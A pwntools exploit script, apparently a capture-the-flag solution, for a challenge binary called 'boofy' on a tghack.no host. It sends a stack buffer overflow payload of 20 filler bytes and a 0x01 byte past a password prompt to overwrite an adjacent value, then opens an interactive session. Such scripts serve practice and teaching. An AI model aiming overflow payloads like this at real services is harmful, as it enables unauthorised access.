#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF('./boofy')

host = args.HOST or 'boofy.tghack.no'
port = int(args.PORT or 6003)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()
io.recvuntil("Please enter the password?\n")

payload = (
    b"A" * 20 +
    b"\x01"
)
io.sendline(payload)

io.interactive()
